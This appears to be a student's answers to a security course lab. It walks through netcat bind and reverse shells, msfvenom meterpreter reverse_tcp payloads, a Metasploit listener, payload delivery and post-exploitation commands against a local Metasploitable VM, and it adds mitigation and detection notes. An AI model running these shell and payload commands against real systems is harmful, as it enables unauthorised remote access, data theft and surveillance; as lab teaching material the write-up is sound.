# Exercises
## 01a) You should have all the VMs running
Done (See Lab-01a)

## 01b Finish the exercise 01b
Done (See Lab-01b)

## 02a Group work: thinking about threats
**Brain storm about how the attack surface looks like, i.e., whereone could attack the system.**

![Thinking about threats](/Lab-02/2a_thinking_about_threats.png)

**Answers:**
* Spoofing
* Input validation (Tampering) -> SQL Injection
* Denial of service attacks
* Privilege escalation
* Social engineering


## 02b Tutorial on Metasploit | Walk through in Exercise
### (Virtual Box) Networking Options
**Explain to your group or shortly write down the explanation for:**

Network Address Translation (NAT)
* It's a way to map multiple local private addresses to a public one before transferring the information


NAT Network
*  A NAT network is a type of internal network that allows outbound connections

Bridged networking
* This is for more advanced networking needs, such as network simulations and running servers in a guest. When enabled, VirtualBox connects to one of your installed network cards and exchanges network packets directly, circumventing your host operating system's network stack.

Host only
* This can be used to create a network containing the host and a set of virtual machines, without the need for the host's physical network interface. Instead, a virtual network interface, similar to a loopback interface, is created on the host, providing connectivity among virtual machines and the host.

### Prepping our Exercise: VM ip address
**Which command would you use to get the IP in Linux?**  

```shell
$ ifconfig # method 1
$ ip addr # method 2
```

**Which command would you use to get the IP in Windows?**  

```shell
$ ipconfig 
```

**Inspect the whole network configuration of the Linux metasploitable VM, i.e., interfaces, ip addresses, routes.**  
Done

### Testing the Tools Presented in Class
**Using John the Ripper to brute-force Kali's password database. Make things more interesting by changing your password with the passwd command.**  
```shell
$ .\john.exe passwordfile –wordlist=”wordlist.txt # To generally brute force a passwordfile use
$ passwd berkankutuk # Changing password
```

**Check for open sockets with netstat or ss. Start the apache2 web server and check again.
Use nmap on Kali to find the other virtual machines**  
```shell
$ nmap -sT -A 10.0.2.0/24
```

**Perform all examples for netcat, i.e.,**  
**Create a listener and connect to it from another terminal window cf. "Opening Pipes Over the Network".**  
```shell
$ nc -lvp 1337 # Listening on a port
```

and from another terminal 

```shell
$ ifconfig # Find machine ip=10.0.2.15
$ nc 10.0.2.15 1337 # Connecting to port
```

**Connect to a remote shell cf. "Opening a Shell Over the Network with netcat".**  
Host machine ip: 10.0.2.15

```shell
$ nc -lvp 1337 -e /bin/bash # Opening the tunnel
```

and from the remote machine

```shell
$ nc 10.0.2.15 1337 # Connecting to the port
$ whoami # Testing access
```

**Perform the "Basic Reverse Shell" example.**  
Host machine ip: 10.0.2.15

```shell
$ nc -lvp 1337 # Opening port
```

'Compromised machine'
```shell
$ nc 10.0.2.15 1337 -e /bin/bash # Connecting to the port
```

and back to host machine
```shell
$ whoami # Testing access
```

**Transfer a file with netcat.**  
Host machine ip: 10.0.2.15

```shell
$ echo 'password is: iamhecker' >> secret.txt # Creating the file
$ nc -lvp 1337 < secret.txt # Opening port and streaming the file
```

on another machine

```shell
$ nc 10.0.2.15 1337 > received.txt # Connecting to the port
$ cat received.txt # Checking the content
```

## Simulating Remote Access
Attacker: 10.0.2.15 (Kali Linux)  
Target: 10.0.2.4 (metasploitable)  

Steps
1. We create a payload, which will establish a connection to the hacking VM
2. Get this payload to the target machine
3. Have a listener running on the attacker's machine, which will receive the connection.
4. Finally execute the payload from the target machine.
5. And then explore the abilities of metasploit's meterpreter.

**Creating the malicious executable**  

```shell
$ msfvenom -p linux/x86/meterpreter/reverse_tcp -a x86 --platform linux -f elf LHOST=10.0.2.15 LPORT=1337 -o payload.elf
```

For windows

```shell
$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe LHOST=10.0.2.15 LPORT=1337 -o payload.exe
```

**Can you explain the difference in the parameter of the "-f" option? What is it good for?**
man msfvenom | grep "\-f"
```shell
$ man msfvenom | grep "\-f" # Using the manual page to get the answer
```

Answer: The flag `-f` sets the output format

## Setting up a Listener
**The above malicious code is trying to access a configured host/port combination, awaiting further instructions. Therefore, we have to provide a server the malicious code can connect to.**

```shell
$ msfconsole 
msf6 $> use multi/handler
msf6 $> set payload linux/x86/meterpreter/reverse_tcp
msf6 $> show options
msf6 $> set LHOST 10.0.2.15
msf6 $> set LPORT 1337
msf6 $> exploit
```

now open another terminal

```shell
$ nc -lvp 1337 < payload.elf
```

shift over to your target machine and type

```shell
$ nc 10.0.2.15 1337 > payload.elf # Connecting to the port
$ chmod a+x ./payload.elf # Making the file executable
$ ./payload.elf # Running the executable
```

aaand back to the host again

```shell
meterpreter$ ls # Testing connection
```
Boom pwned!

## Enjoying Your Connection
Getting the username

```shell
meterpreter$ getuid 
```


Getting system info
```shell
meterpreter$ sysinfo 
```

[Other Metasploit commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/).

**Questions**  
**How you tested the vulnerability in Metasploitable3. Provide information obtained from "sysinfo" to prove that you did get access into the specific machine.**
```shell
meterpreter$ sysinfo 
Computer     : 10.0.2.4
OS           : Ubuntu 14.04 (Linux 3.13.0-24-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

**What the vulnerability or security problem really is**  
Reverse shell

**Explain whether Metasploitable3 is vulnerable to this exploit.**  
?

**Explain how your client that is using the vulnerable machine (Metasploitable3) should mitigate the risks of falling prey to this exploit.**  
1. Educate staff into not opening random files on their computer
2. Use anti virus software that can run the software in a sandbox
3. Software restriction policies
4. Disable .exe files to run from specified directories
5. Setup a firewall
6. Never give admin acess to end users
7. Segregate network

**Explain how you can make someone download and install the malicious file in his/her environment that is vulnerable as well as one that is not vulnerable.**    
Sending the file via email or from another platform to a target person.

## Further Questions
**What is the practical use of this exercise? And why is the payload working in the way it is?**  
To showcase how we can obtain a reverse shell, which in this case is working because no work have been done in order to secure the target machine. 

**Which folder are you in when you get the meterpreter prompt? And what is the system-information?**  
```shell
meterpreter$ pwd 
/home/vagrant
```

**To user and the owner of this system how would you mitigate this attack?**   
To the user: Since the tunnel closes as soon as the application stops running, the user should immediadly close the application.

For the owner of the system: Implement a firewall and add policies.

**Now that you have access to the Metasploitable machine what else can we do? Get the list of users on this server, using a shell prompt by typing "shell" into the Meterpreter shell.**
```shell
meterpreter$ shell 
```  

Hints:
- Under Linux check /etc/passwd.
- Under Windows, type "net users".


**To go back to the meterpreter prompt enter "exit"**
```shell
meterpreter$ exit 
```  

**Using the meterpreter shell, check the output of the "arp" command. What do you find?**
```shell
meterpreter$ arp 
ARP cache
=========

    IP address  MAC address        Interface
    ----------  -----------        ---------
    10.0.2.1    52:54:00:12:35:00
    10.0.2.3    08:00:27:8f:11:1d
    10.0.2.15   08:00:27:cf:52:df
```  

**At the meterpreter prompt type in help to see a list of commands. Also look at the this link for other commands. For Windows machines, there is for example the winenum command.**
```shell
meterpreter$ help 
```  

* webcam_snap: Take a snapshot from the specified webcam_snap
* mic_start: start capturing an audio streaming
* play: play a waveform audio filee (.wav) on the target system
* downlaod: downlaod a file
* execute: execute a command
* and maaaaaaaaaany more

---
**Now lets be on the other side of the fence and investigate suspicious connections to our metasploitable server. Which command can you use to see network status and connections?**
```shell
$ netstat -plnt
```  

**Is there an anomaly or suspicious connection to our server? What makes it suspicious?**  
Some unusual established connections, through some suspicious ports.

**How you would test the vulnerability of an AppleTV using metasploit? Discuss in a group or 
write the procedure down.**
1. `nmap` to gather version
2. Use `searchsploit` to search after apple tv and known exploits